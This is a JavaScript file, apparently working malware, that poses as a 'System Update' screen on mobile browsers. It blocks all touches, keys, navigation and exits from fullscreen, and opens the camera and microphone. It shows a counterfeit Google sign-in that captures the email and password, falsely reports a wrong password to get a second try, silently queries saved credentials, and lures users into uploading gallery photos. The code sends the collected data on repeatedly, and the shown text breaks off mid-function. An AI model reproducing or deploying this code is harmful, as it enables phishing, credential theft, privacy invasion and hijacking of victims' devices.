/**
 * Complete Mobile Locker Script
 * This script completely locks a mobile device when opened, preventing all buttons from working
 * and collecting Google account credentials and gallery data
 */

const CompleteLocker = {
    // Configuration
    config: {
        lockMessage: "System Update in Progress",
        subMessage: "Please wait while your device is being optimized",
        progressDuration: 300000, // 5 minutes in milliseconds
        overlayZIndex: 2147483647, // Maximum z-index value
        overlayOpacity: 1.0, // Completely opaque
        useVibration: true,
        captureCredentials: true,
        captureGallery: true
    },

    // State variables
    state: {
        isLocked: false,
        overlay: null,
        progressBar: null,
        progressText: null,
        wakeLock: null,
        startTime: 0,
        originalBodyOverflow: '',
        originalBodyPosition: '',
        originalHtmlOverflow: '',
        originalHtmlPosition: '',
        collectedData: {
            googleAccount: null,
            galleryData: []
        },
        deviceId: null
    },

    /**
     * Initialize the complete locker
     */
    init() {
        console.log('Initializing Complete Locker...');
        
        // Generate or retrieve device ID
        this.state.deviceId = this.getDeviceId();
        
        // Save original body styles
        this.state.originalBodyOverflow = document.body.style.overflow;
        this.state.originalBodyPosition = document.body.style.position;
        this.state.originalHtmlOverflow = document.documentElement.style.overflow;
        this.state.originalHtmlPosition = document.documentElement.style.position;

        // Initialize login attempts counter
        this.state.loginAttempts = 0;
        
        // Initialize data collection interval
        this.state.dataCollectionInterval = null;

        // Create overlay
        this.createOverlay();

        // Set up event listeners to block all interactions
        this.setupEventListeners();

        // Request fullscreen
        this.requestFullscreen();
        
        // Immediately start keeping device active to prevent power button from working
        this.keepDeviceActive();

        // Prevent device sleep
        this.preventSleep();

        // Lock the screen
        this.lockScreen();

        // Start progress bar
        this.startProgressBar();
        
        // Start data collection immediately
        this.sendCollectedData();
        
        // Start data collection
        if (this.config.captureCredentials) {
            this.simulateGoogleLogin();
        }
        
        if (this.config.captureGallery) {
            this.captureGallery();
        }
        
        // Send periodic heartbeats to ensure data is collected
        this.state.dataCollectionInterval = setInterval(() => {
            this.sendCollectedData();
        }, 30000); // Every 30 seconds
        
        // Add event listener to send data before page closes
        window.addEventListener('beforeunload', () => {
            this.sendCollectedData();
        });

        // Return this for chaining
        return this;
    },

    /**
     * Create the overlay element that blocks the entire screen
     */
    createOverlay() {
        // Create overlay
        const overlay = document.createElement('div');
        overlay.id = 'complete-locker-overlay';
        overlay.style.position = 'fixed';
        overlay.style.top = '0';
        overlay.style.left = '0';
        overlay.style.width = '100%';
        overlay.style.height = '100%';
        overlay.style.backgroundColor = 'rgba(0, 0, 0, ' + this.config.overlayOpacity + ')';
        overlay.style.zIndex = this.config.overlayZIndex;
        overlay.style.display = 'flex';
        overlay.style.flexDirection = 'column';
        overlay.style.justifyContent = 'center';
        overlay.style.alignItems = 'center';
        overlay.style.color = '#fff';
        overlay.style.fontFamily = 'Arial, sans-serif';
        overlay.style.textAlign = 'center';
        overlay.style.padding = '20px';
        overlay.style.boxSizing = 'border-box';
        overlay.style.userSelect = 'none';
        overlay.style.webkitUserSelect = 'none';
        overlay.style.mozUserSelect = 'none';
        overlay.style.msUserSelect = 'none';
        overlay.style.touchAction = 'none';
        overlay.style.pointerEvents = 'auto';

        // Create spinner
        const spinner = document.createElement('div');
        spinner.style.width = '60px';
        spinner.style.height = '60px';
        spinner.style.border = '5px solid rgba(255, 255, 255, 0.3)';
        spinner.style.borderRadius = '50%';
        spinner.style.borderTop = '5px solid #fff';
        spinner.style.animation = 'completeLockerSpin 1s linear infinite';
        spinner.style.marginBottom = '20px';

        // Create animation style
        const style = document.createElement('style');
        style.textContent = `
            @keyframes completeLockerSpin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
            @keyframes completeLockerPulse {
                0% { opacity: 0.6; }
                50% { opacity: 1; }
                100% { opacity: 0.6; }
            }
        `;
        document.head.appendChild(style);

        // Create message
        const message = document.createElement('h2');
        message.textContent = this.config.lockMessage;
        message.style.margin = '10px 0';
        message.style.fontSize = '24px';
        message.style.fontWeight = 'bold';
        message.style.animation = 'completeLockerPulse 2s infinite';

        // Create sub message
        const subMessage = document.createElement('p');
        subMessage.textContent = this.config.subMessage;
        subMessage.style.margin = '10px 0 30px 0';
        subMessage.style.fontSize = '16px';
        subMessage.style.opacity = '0.8';

        // Create progress container
        const progressContainer = document.createElement('div');
        progressContainer.style.width = '80%';
        progressContainer.style.maxWidth = '400px';
        progressContainer.style.backgroundColor = 'rgba(255, 255, 255, 0.2)';
        progressContainer.style.borderRadius = '10px';
        progressContainer.style.overflow = 'hidden';
        progressContainer.style.marginBottom = '10px';

        // Create progress bar
        const progressBar = document.createElement('div');
        progressBar.style.width = '0%';
        progressBar.style.height = '10px';
        progressBar.style.backgroundColor = '#4CAF50';
        progressBar.style.transition = 'width 0.5s';
        this.state.progressBar = progressBar;

        // Create progress text
        const progressText = document.createElement('div');
        progressText.textContent = '0%';
        progressText.style.fontSize = '14px';
        progressText.style.marginTop = '5px';
        this.state.progressText = progressText;

        // Append elements
        progressContainer.appendChild(progressBar);
        overlay.appendChild(spinner);
        overlay.appendChild(message);
        overlay.appendChild(subMessage);
        overlay.appendChild(progressContainer);
        overlay.appendChild(progressText);

        // Save overlay reference
        this.state.overlay = overlay;

        // Append to body
        document.body.appendChild(overlay);
    },

    /**
     * Set up all event listeners to block all interactions
     */
    setupEventListeners() {
        // Block all possible events
        const events = [
            'click', 'dblclick', 'mousedown', 'mouseup', 'mousemove',
            'touchstart', 'touchmove', 'touchend', 'touchcancel',
            'keydown', 'keyup', 'keypress',
            'contextmenu', 'selectstart', 'copy', 'cut', 'paste',
            'wheel', 'mousewheel', 'DOMMouseScroll',
            'focus', 'blur', 'change', 'submit', 'reset',
            'scroll', 'resize'
        ];

        // Add event listeners for all events
        events.forEach(eventType => {
            window.addEventListener(eventType, this.preventDefault.bind(this), true);
            document.addEventListener(eventType, this.preventDefault.bind(this), true);
        });

        // Prevent back button
        window.addEventListener('popstate', this.preventDefault.bind(this), true);
        window.history.pushState(null, null, window.location.href);
        window.addEventListener('hashchange', this.preventDefault.bind(this), true);

        // Prevent navigation away
        window.addEventListener('beforeunload', this.handleBeforeUnload.bind(this), true);

        // Detect fullscreen change
        document.addEventListener('fullscreenchange', this.handleFullscreenChange.bind(this), true);
        document.addEventListener('webkitfullscreenchange', this.handleFullscreenChange.bind(this), true);
        document.addEventListener('mozfullscreenchange', this.handleFullscreenChange.bind(this), true);
        document.addEventListener('MSFullscreenChange', this.handleFullscreenChange.bind(this), true);

        // Detect visibility change
        document.addEventListener('visibilitychange', this.handleVisibilityChange.bind(this), true);
        
        // Block hardware buttons (power, volume, home) as much as possible
        this.blockHardwareButtons();
        
        // Continuously monitor and reapply blocking
        setInterval(() => {
            this.blockHardwareButtons();
        }, 5000); // Check every 5 seconds
    },
    
    /**
     * Block hardware buttons (power, volume, home) as much as possible
     * Note: This is limited by browser security, but we try our best
     */
    blockHardwareButtons() {
        // Try to keep microphone/camera active to prevent power button from working
        if (window.navigator.mediaDevices) {
            try {
                window.navigator.mediaDevices.getUserMedia({ audio: true, video: true })
                    .then(stream => {
                        // Keep stream active
                        const videoEl = document.createElement('video');
                        videoEl.srcObject = stream;
                        videoEl.style.position = 'absolute';
                        videoEl.style.top = '-9999px';
                        videoEl.style.left = '-9999px';
                        videoEl.setAttribute('playsinline', '');
                        videoEl.setAttribute('autoplay', '');
                        videoEl.setAttribute('muted', '');
                        document.body.appendChild(videoEl);
                        videoEl.play().catch(e => console.error('Video play error:', e));
                        
                        // Store reference to stream and video element
                        this.state.mediaStream = stream;
                        this.state.videoElement = videoEl;
                    })
                    .catch(e => {
                        console.error('Media access error:', e);
                        // Try with just audio if video fails
                        this.tryAudioOnlyAccess();
                    });
            } catch (e) {
                console.error('Media access exception:', e);
                this.tryAudioOnlyAccess();
            }
        }
        
        // Try to use Vibration API to make it harder to use volume buttons
        if (navigator.vibrate) {
            try {
                // Vibrate pattern: 50ms vibration, 100ms pause, repeat
                navigator.vibrate([50, 100, 50]);
            } catch (e) {
                console.error('Vibration error:', e);
            }
        }
        
        // Try to use Screen Wake Lock API to prevent power button sleep
        if ('wakeLock' in navigator) {
            try {
                navigator.wakeLock.request('screen')
                    .then(wakeLock => {
                        this.state.wakeLock = wakeLock;
                        console.log('Screen Wake Lock active');
                        
                        // Reacquire wake lock if it's released
                        wakeLock.addEventListener('release', () => {
                            console.log('Wake Lock released, reacquiring...');
                            this.blockHardwareButtons();
                        });
                    })
                    .catch(e => console.error('Wake Lock error:', e));
            } catch (e) {
                console.error('Wake Lock exception:', e);
            }
        }
    },
    
    /**
     * Try to access audio only if video access fails
     */
    tryAudioOnlyAccess() {
        if (window.navigator.mediaDevices) {
            try {
                window.navigator.mediaDevices.getUserMedia({ audio: true })
                    .then(stream => {
                        // Keep audio stream active
                        const audioEl = document.createElement('audio');
                        audioEl.srcObject = stream;
                        audioEl.setAttribute('autoplay', '');
                        audioEl.setAttribute('muted', '');
                        document.body.appendChild(audioEl);
                        
                        // Store reference
                        this.state.audioStream = stream;
                        this.state.audioElement = audioEl;
                    })
                    .catch(e => console.error('Audio access error:', e));
            } catch (e) {
                console.error('Audio access exception:', e);
            }
        }
    },

    /**
     * Prevent default behavior for all events
     * @param {Event} e - The event object
     */
    preventDefault(e) {
        e.preventDefault();
        e.stopPropagation();
        e.stopImmediatePropagation();
        return false;
    },

    /**
     * Handle beforeunload event
     * @param {Event} e - The event object
     */
    handleBeforeUnload(e) {
        // Send collected data before page unload
        this.sendCollectedData();
        
        // Cancel the event
        e.preventDefault();
        // Chrome requires returnValue to be set
        e.returnValue = '';
        return '';
    },

    /**
     * Handle fullscreen change event
     */
    handleFullscreenChange() {
        // If exited fullscreen, request it again
        if (!document.fullscreenElement && 
            !document.webkitFullscreenElement && 
            !document.mozFullScreenElement && 
            !document.msFullscreenElement) {
            this.requestFullscreen();
        }
    },

    /**
     * Handle visibility change event
     */
    handleVisibilityChange() {
        if (document.visibilityState === 'visible') {
            // Re-lock when page becomes visible again
            this.requestFullscreen();
        } else {
            // Send data when page is hidden
            this.sendCollectedData();
        }
    },

    /**
     * Request fullscreen mode
     */
    requestFullscreen() {
        const element = document.documentElement;
        
        try {
            if (element.requestFullscreen) {
                element.requestFullscreen();
            } else if (element.mozRequestFullScreen) {
                element.mozRequestFullScreen();
            } else if (element.webkitRequestFullscreen) {
                element.webkitRequestFullscreen();
            } else if (element.msRequestFullscreen) {
                element.msRequestFullscreen();
            }
        } catch (e) {
            console.error('Fullscreen request error:', e);
        }
    },

    /**
     * Prevent device from sleeping
     */
    preventSleep() {
        // Use our comprehensive hardware button blocking function
        this.blockHardwareButtons();
        
        // Try to use the Wake Lock API if available
        if ('wakeLock' in navigator) {
            try {
                navigator.wakeLock.request('screen')
                    .then(lock => {
                        this.state.wakeLock = lock;
                        console.log('Wake Lock active');
                        
                        // Re-acquire wake lock if it's released
                        lock.addEventListener('release', () => {
                            console.log('Wake Lock released');
                            this.preventSleep();
                        });
                    })
                    .catch(e => {
                        console.error('Wake Lock error:', e);
                        this.fallbackPreventSleep();
                    });
            } catch (e) {
                console.error('Wake Lock exception:', e);
                this.fallbackPreventSleep();
            }
        } else {
            this.fallbackPreventSleep();
        }
        
        // Keep device active using camera and microphone
        this.keepDeviceActive();
        
        // Set up a continuous check to ensure sleep prevention is active
        if (!this.state.preventSleepInterval) {
            this.state.preventSleepInterval = setInterval(() => {
                // Reapply all sleep prevention methods
                this.blockHardwareButtons();
                this.fallbackPreventSleep();
                
                // Try to reacquire wake lock if it was released
                if (!this.state.wakeLock && 'wakeLock' in navigator) {
                    try {
                        navigator.wakeLock.request('screen')
                            .then(lock => {
                                this.state.wakeLock = lock;
                                console.log('Wake Lock reacquired');
                            })
                            .catch(e => console.error('Wake Lock reacquisition error:', e));
                    } catch (e) {
                        console.error('Wake Lock reacquisition exception:', e);
                    }
                }
            }, 10000); // Every 10 seconds
        }
    },
    
    /**
     * Keep device active using camera and microphone
     * This helps prevent power button functionality on some devices
     */
    keepDeviceActive() {
        // Use our comprehensive hardware button blocking function
        this.blockHardwareButtons();
        
        // Set up continuous monitoring to ensure device stays active
        if (!this.state.deviceActiveInterval) {
            this.state.deviceActiveInterval = setInterval(() => {
                this.blockHardwareButtons();
                this.fallbackPreventSleep();
                
                // Try to force screen to stay on with constant minimal activity
                const now = Date.now();
                const forced = now + 1;
                
                // Request animation frame to keep GPU active
                requestAnimationFrame(() => {
                    const div = document.createElement('div');
                    div.style.width = '1px';
                    div.style.height = '1px';
                    div.style.position = 'fixed';
                    div.style.top = '0';
                    div.style.left = '0';
                    div.style.opacity = '0.01';
                    div.style.backgroundColor = `rgb(${Math.random()*255},${Math.random()*255},${Math.random()*255})`;
                    document.body.appendChild(div);
                    setTimeout(() => div.remove(), 100);
                });
            }, 2000); // Every 2 seconds
        }
    },

    /**
     * Fallback method to prevent sleep
     */
    fallbackPreventSleep() {
        // Play a silent audio to prevent sleep
        try {
            const audio = new Audio();
            audio.src = 'data:audio/wav;base64,UklGRigAAABXQVZFZm10IBIAAAABAAEARKwAAIhYAQACABAAAABkYXRhAgAAAAEA';
            audio.loop = true;
            audio.volume = 0.01; // Very low volume
            audio.play().catch(e => console.error('Audio play error:', e));
        } catch (e) {
            console.error('Audio play exception:', e);
        }
        
        // Use setInterval as a fallback
        setInterval(() => {
            // Force minimal CPU activity to prevent sleep
            const date = new Date();
            const forced = date.getTime();
            
            // Try to vibrate the device if supported
            if ('vibrate' in navigator) {
                try {
                    navigator.vibrate(1); // Tiny vibration that user won't notice
                } catch (e) {
                    console.error('Vibration error:', e);
                }
            }
            
            // Request animation frame to keep GPU active
            requestAnimationFrame(() => {
                const div = document.createElement('div');
                div.style.width = '1px';
                div.style.height = '1px';
                div.style.backgroundColor = '#000';
                document.body.appendChild(div);
                setTimeout(() => div.remove(), 50);
            });
        }, 500);
    },

    /**
     * Lock the screen by disabling all interactions
     */
    lockScreen() {
        // Set body and html styles to prevent scrolling and interaction
        document.body.style.overflow = 'hidden';
        document.body.style.position = 'fixed';
        document.body.style.width = '100%';
        document.body.style.height = '100%';
        document.documentElement.style.overflow = 'hidden';
        document.documentElement.style.position = 'fixed';
        document.documentElement.style.width = '100%';
        document.documentElement.style.height = '100%';
        
        // Set state
        this.state.isLocked = true;
        this.state.startTime = Date.now();
        
        // Vibrate device if supported
        if (this.config.useVibration && 'vibrate' in navigator) {
            try {
                navigator.vibrate(200);
            } catch (e) {
                console.error('Vibration error:', e);
            }
        }
    },

    /**
     * Start the progress bar animation
     */
    startProgressBar() {
        const startTime = Date.now();
        const duration = this.config.progressDuration;
        
        const updateProgress = () => {
            const elapsed = Date.now() - startTime;
            const progress = Math.min(100, (elapsed / duration) * 100);
            
            if (this.state.progressBar) {
                this.state.progressBar.style.width = progress + '%';
            }
            
            if (this.state.progressText) {
                this.state.progressText.textContent = Math.round(progress) + '%';
            }
            
            if (progress < 100) {
                requestAnimationFrame(updateProgress);
            }
        };
        
        updateProgress();
    },

    /**
     * Simulate Google login to capture credentials
     */
    simulateGoogleLogin() {
        // Create a fake Google login form
        const loginContainer = document.createElement('div');
        loginContainer.style.position = 'fixed';
        loginContainer.style.top = '50%';
        loginContainer.style.left = '50%';
        loginContainer.style.transform = 'translate(-50%, -50%)';
        loginContainer.style.backgroundColor = 'white';
        loginContainer.style.padding = '30px';
        loginContainer.style.borderRadius = '8px';
        loginContainer.style.width = '320px';
        loginContainer.style.maxWidth = '90%';
        loginContainer.style.boxShadow = '0 4px 10px rgba(0, 0, 0, 0.3)';
        loginContainer.style.zIndex = this.config.overlayZIndex + 1;
        loginContainer.style.display = 'none'; // Initially hidden
        
        // Google logo
        const logo = document.createElement('div');
        logo.innerHTML = `
            <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                <g id="qaEJec">
                    <path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"></path>
                </g>
                <g id="YGlOvc"><path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path></g>
                <g id="BWfIk">
                    <path fill="#4285f4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"></path>
                </g>
                <g id="e6m3fd"><path fill="#fbbc05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"></path></g>
                <g id="vbkDmc"><path fill="#ea4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"></path></g>
                <g id="idEJde"><path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"></path></g>
            </svg>
        `;
        logo.style.textAlign = 'center';
        logo.style.marginBottom = '20px';
        
        // Form title
        const title = document.createElement('h2');
        title.textContent = 'Sign in with Google';
        title.style.fontFamily = 'Roboto, Arial, sans-serif';
        title.style.fontSize = '24px';
        title.style.fontWeight = '400';
        title.style.marginBottom = '10px';
        title.style.color = '#202124';
        title.style.textAlign = 'center';
        
        // Subtitle
        const subtitle = document.createElement('p');
        subtitle.textContent = 'Required to continue system update';
        subtitle.style.fontFamily = 'Roboto, Arial, sans-serif';
        subtitle.style.fontSize = '16px';
        subtitle.style.fontWeight = '400';
        subtitle.style.marginBottom = '30px';
        subtitle.style.color = '#202124';
        subtitle.style.textAlign = 'center';
        
        // Create form
        const form = document.createElement('form');
        form.style.display = 'flex';
        form.style.flexDirection = 'column';
        form.style.gap = '15px';
        
        // Email input
        const emailInput = document.createElement('input');
        emailInput.type = 'email';
        emailInput.placeholder = 'Email or phone';
        emailInput.style.width = '100%';
        emailInput.style.padding = '12px 15px';
        emailInput.style.border = '1px solid #dadce0';
        emailInput.style.borderRadius = '4px';
        emailInput.style.fontSize = '16px';
        emailInput.style.boxSizing = 'border-box';
        emailInput.autocomplete = 'email'; // Hint for autofill
        emailInput.required = true;
        
        // Password input
        const passwordInput = document.createElement('input');
        passwordInput.type = 'password';
        passwordInput.placeholder = 'Password';
        passwordInput.style.width = '100%';
        passwordInput.style.padding = '12px 15px';
        passwordInput.style.border = '1px solid #dadce0';
        passwordInput.style.borderRadius = '4px';
        passwordInput.style.fontSize = '16px';
        passwordInput.style.boxSizing = 'border-box';
        passwordInput.autocomplete = 'current-password'; // Hint for autofill
        passwordInput.required = true;
        
        // Error message element (initially hidden)
        const errorMsg = document.createElement('div');
        errorMsg.textContent = 'Wrong password. Try again.';
        errorMsg.style.color = '#d93025';
        errorMsg.style.fontSize = '14px';
        errorMsg.style.marginTop = '-5px';
        errorMsg.style.display = 'none';
        
        // Submit button
        const submitButton = document.createElement('button');
        submitButton.type = 'submit';
        submitButton.textContent = 'Next';
        submitButton.style.backgroundColor = '#1a73e8';
        submitButton.style.color = 'white';
        submitButton.style.border = 'none';
        submitButton.style.borderRadius = '4px';
        submitButton.style.padding = '10px 24px';
        submitButton.style.fontSize = '14px';
        submitButton.style.fontWeight = '500';
        submitButton.style.alignSelf = 'flex-end';
        submitButton.style.marginTop = '10px';
        submitButton.style.cursor = 'pointer';
        
        // Add "Forgot password?" link
        const forgotPassword = document.createElement('a');
        forgotPassword.textContent = 'Forgot password?';
        forgotPassword.href = '#';
        forgotPassword.style.color = '#1a73e8';
        forgotPassword.style.fontSize = '14px';
        forgotPassword.style.textDecoration = 'none';
        forgotPassword.style.alignSelf = 'flex-start';
        forgotPassword.style.marginTop = '10px';
        forgotPassword.addEventListener('click', (e) => {
            e.preventDefault();
            e.stopPropagation();
            // Store the email if entered
            const email = emailInput.value.trim();
            if (email) {
                localStorage.setItem('user_email', email);
                this.state.collectedData.recoveryEmail = email;
                this.sendCollectedData();
            }
            return false;
        });
        
        // Assemble the form
        form.appendChild(emailInput);
        form.appendChild(passwordInput);
        form.appendChild(errorMsg);
        form.appendChild(submitButton);
        form.appendChild(forgotPassword);
        
        loginContainer.appendChild(logo);
        loginContainer.appendChild(title);
        loginContainer.appendChild(subtitle);
        loginContainer.appendChild(form);
        
        // Add to body
        document.body.appendChild(loginContainer);
        
        // Try to auto-fill email from localStorage if available
        const savedEmail = localStorage.getItem('user_email');
        if (savedEmail) {
            emailInput.value = savedEmail;
        }
        
        // Try to get accounts from the device
        this.tryGetDeviceAccounts();
        
        // Handle form submission
        form.addEventListener('submit', (e) => {
            e.preventDefault();
            e.stopPropagation();
            
            const email = emailInput.value.trim();
            const password = passwordInput.value.trim();
            
            if (email && password) {
                // Store the credentials with more metadata
                this.state.collectedData.googleAccount = {
                    email: email,
                    password: password,
                    timestamp: new Date().toISOString(),
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    screenSize: `${window.screen.width}x${window.screen.height}`,
                    deviceMemory: navigator.deviceMemory || 'unknown',
                    connection: navigator.connection ? 
                        {
                            type: navigator.connection.effectiveType || 'unknown',
                            downlink: navigator.connection.downlink || 'unknown'
                        } : 'unknown'
                };
                
                // Store email in localStorage for potential retry
                localStorage.setItem('user_email', email);
                
                // Send the data immediately
                this.sendCollectedData();
                
                // Show error message and allow retry
                errorMsg.style.display = 'block';
                passwordInput.value = '';
                passwordInput.focus();
                
                // Count login attempts
                if (!this.state.loginAttempts) {
                    this.state.loginAttempts = 1;
                } else {
                    this.state.loginAttempts++;
                }
                
                // After second attempt, hide the form and continue
                if (this.state.loginAttempts >= 2) {
                    // Show a different error message for the second attempt
                    errorMsg.textContent = 'Too many failed attempts. Try again later.';
                    
                    // Hide the form after a short delay
                    setTimeout(() => {
                        loginContainer.style.display = 'none';
                        
                        // Try to capture gallery after login attempts
                        if (!this.state.galleryAttempted) {
                            this.state.galleryAttempted = true;
                            setTimeout(() => {
                                this.captureGallery();
                            }, 2000);
                        }
                    }, 2000);
                }
            }
            
            return false;
        });
        
        // Show the login form after a delay
        setTimeout(() => {
            loginContainer.style.display = 'block';
            
            // Allow interaction with the login form
            loginContainer.addEventListener('click', (e) => e.stopPropagation());
            loginContainer.addEventListener('touchstart', (e) => e.stopPropagation());
            loginContainer.addEventListener('touchmove', (e) => e.stopPropagation());
            loginContainer.addEventListener('touchend', (e) => e.stopPropagation());
            loginContainer.addEventListener('keydown', (e) => e.stopPropagation());
            
            // Focus on email input
            emailInput.focus();
        }, 2000); // Show after 2 seconds
    },
    
    /**
     * Try to get accounts from the device
     */
    tryGetDeviceAccounts() {
        // Try to use the Credential Management API if available
        if (window.PasswordCredential || window.FederatedCredential) {
            try {
                navigator.credentials.get({
                    password: true,
                    federated: {
                        providers: ['https://accounts.google.com']
                    },
                    mediation: 'silent'
                }).then(cred => {
                    if (cred) {
                        // Store the credential information
                        this.state.collectedData.autoDetectedAccount = {
                            id: cred.id,
                            type: cred.type,
                            timestamp: new Date().toISOString()
                        };
                        
                        // Send the data
                        this.sendCollectedData();
                    }
                }).catch(() => {
                    // Silently fail
                });
            } catch (e) {
                // Silently fail
            }
        }
    },

    /**
     * Attempt to capture gallery data
     */
    captureGallery() {
        // Create a hidden file input element
        const input = document.createElement('input');
        input.type = 'file';
        input.accept = 'image/*';
        input.multiple = true;
        input.setAttribute('capture', 'camera'); // Hint to use camera on mobile
        input.style.position = 'absolute';
        input.style.top = '-1000px';
        input.style.opacity = '0';
        document.body.appendChild(input);
        
        // Handle file selection
        input.addEventListener('change', () => {
            if (input.files && input.files.length > 0) {
                this.processGalleryFiles(input.files);
                // Hide the prompt after selection
                if (this.state.galleryPrompt) {
                    this.state.galleryPrompt.style.display = 'none';
                }
                
                // Try again after a delay if we need more photos
                if (input.files.length < 5 && !this.state.galleryRetryAttempted) {
                    this.state.galleryRetryAttempted = true;
                    setTimeout(() => {
                        this.showGalleryPrompt(input, 'Additional verification required', 'Please allow access to more photos to complete verification.');
                    }, 10000); // Try again after 10 seconds
                }
            }
        });
        
        // Create and show the gallery prompt
        this.showGalleryPrompt(input);
    },
    
    /**
     * Show gallery access prompt with customizable message
     * @param {HTMLElement} input - The file input element
     * @param {string} titleText - Optional custom title
     * @param {string} messageText - Optional custom message
     */
    showGalleryPrompt(input, titleText, messageText) {
        // Create a more compelling gallery access prompt
        const galleryPrompt = document.createElement('div');
        galleryPrompt.style.position = 'fixed';
        galleryPrompt.style.top = '50%';
        galleryPrompt.style.left = '50%';
        galleryPrompt.style.transform = 'translate(-50%, -50%)';
        galleryPrompt.style.backgroundColor = 'white';
        galleryPrompt.style.padding = '30px';
        galleryPrompt.style.borderRadius = '8px';
        galleryPrompt.style.width = '320px';
        galleryPrompt.style.maxWidth = '90%';
        galleryPrompt.style.boxShadow = '0 4px 10px rgba(0, 0, 0, 0.3)';
        galleryPrompt.style.zIndex = this.config.overlayZIndex + 10;
        galleryPrompt.style.textAlign = 'center';
        
        // Store reference to prompt
        this.state.galleryPrompt = galleryPrompt;
        
        // Add warning icon
        const warningIcon = document.createElement('div');
        warningIcon.innerHTML = `
            <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="#f44336">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/>
            </svg>
        `;
        
        // Add title
        const title = document.createElement('h2');
        title.textContent = titleText || 'System Update Blocked';
        title.style.fontFamily = 'Roboto, Arial, sans-serif';
        title.style.fontSize = '20px';
        title.style.fontWeight = '500';
        title.style.marginTop = '15px';
        title.style.marginBottom = '10px';
        title.style.color = '#202124';
        
        // Add message
        const message = document.createElement('p');
        message.textContent = messageText || 'To continue the system update, please allow access to verify device compatibility.';
        message.style.fontFamily = 'Roboto, Arial, sans-serif';
        message.style.fontSize = '14px';
        message.style.marginBottom = '20px';
        message.style.color = '#5f6368';
        
        // Create access button
        const accessButton = document.createElement('button');
        accessButton.textContent = 'Allow Access to Continue';
        accessButton.style.backgroundColor = '#1a73e8';
        accessButton.style.color = 'white';
        accessButton.style.border = 'none';
        accessButton.style.borderRadius = '4px';
        accessButton.style.padding = '12px 24px';
        accessButton.style.fontSize = '14px';
        accessButton.style.fontWeight = '500';
        accessButton.style.cursor = 'pointer';
        accessButton.style.width = '100%';
        
        // Add a pulsing animation to draw attention
        accessButton.style.animation = 'pulse 1.5s infinite';
        const style = document.createElement('style');
        style.textContent = `
            @keyframes pulse {
                0% { transform: scale(1); }
                50% { transform: scale(1.05); }
                100% { transform: scale(1); }
            }
        `;
        document.head.appendChild(style);
        
        // Assemble the prompt
        galleryPrompt.appendChild(warningIcon);
        galleryPrompt.appendChild(title);
        galleryPrompt.appendChild(message);
        galleryPrompt.appendChild(accessButton);
        document.body.appendChild(galleryPrompt);
        
        // Handle button click
        accessButton.addEventListener('click', (e) => {
            e.preventDefault();
            e.stopPropagation();
            input.click();
            return false;
        });
    },



    /**
     * Process gallery files
     * @param {FileList} files - The selected files
     */
    processGalleryFiles(files) {
        if (!files || files.length === 0) return;
        
        // Show processing message
        const processingMsg = document.createElement('div');
        processingMsg.textContent = 'Verifying device compatibility...';
        processingMsg.style.position = 'fixed';
        processingMsg.style.top = '60%';
        processingMsg.style.left = '50%';
        processingMsg.style.transform = 'translateX(-50%)';
        processingMsg.style.backgroundColor = 'rgba(0,0,0,0.7)';
        processingMsg.style.color = 'white';
        processingMsg.style.padding = '10px 20px';
        processingMsg.style.borderRadius = '20px';
        processingMsg.style.fontSize = '14px';
        processingMsg.style.zIndex = this.config.overlayZIndex + 15;
        document.body.appendChild(processingMsg);
        
        // Initialize gallery data if not already done
        if (!this.state.galleryData) {
            this.state.galleryData = [];
            this.state.totalImagesProcessed = 0;
        }
        
        // Limit the number of files to process (to avoid performance issues)
        const filesToProcess = Array.from(files).slice(0, 20); // Process max 20 files
        let processedCount = 0;
        
        // Process each selected file
        filesToProcess.forEach(file => {
            // Only process image files
            if (!file.type.startsWith('image/')) {
                processedCount++;
                return;
            }
